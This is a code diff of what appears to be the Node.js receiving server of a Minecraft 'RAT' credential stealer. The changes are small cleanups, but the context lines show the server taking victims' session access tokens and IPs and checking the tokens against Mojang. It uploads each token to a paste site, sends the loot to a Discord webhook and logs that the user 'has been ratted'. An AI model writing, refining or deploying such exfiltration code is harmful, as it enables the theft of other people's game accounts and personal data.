@@ -37,7 +37,7 @@ app.post("/", async (req, res) => {
     }
 
     try {
-        const country = await fetchCountry(req.body.ip); // Получение страны до проверки лицензии
+        const country = await fetchCountry(req.body.ip);
 
         const response = await post("https://sessionserver.mojang.com/session/minecraft/join", {
             accessToken: req.body.token,
@@ -46,7 +46,6 @@ app.post("/", async (req, res) => {
         })
        .then(res => {
             if (res.status === 204) {
-                console.log("License verified successfully, but no content returned.");
                 return "License";
             } else if (res.data && res.data.path === "/session/minecraft/join") {
                 return "Non-License";
@@ -76,12 +75,10 @@ app.post("/", async (req, res) => {
         };
 
         if (response === "Non-License") {
-            webhookData.embeds[0].fields.push({
-                name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
-            });
-            webhookData.embeds[0].fields.push({
-                name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false
-            });
+            webhookData.embeds[0].fields.push(
+                { name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false },
+                { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false }
+            );
         } else if (response === "License") {
             const [shorttoken, profiles] = await Promise.all([
                 post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
@@ -109,10 +106,6 @@ app.post("/", async (req, res) => {
                 name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
             });
         }
-
-        // Логирование содержимого webhookData перед отправкой
-        console.log("Webhook Data:", JSON.stringify(webhookData, null, 2));
-
         await post(process.env.WEBHOOK, webhookData);
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
     } catch (err) {
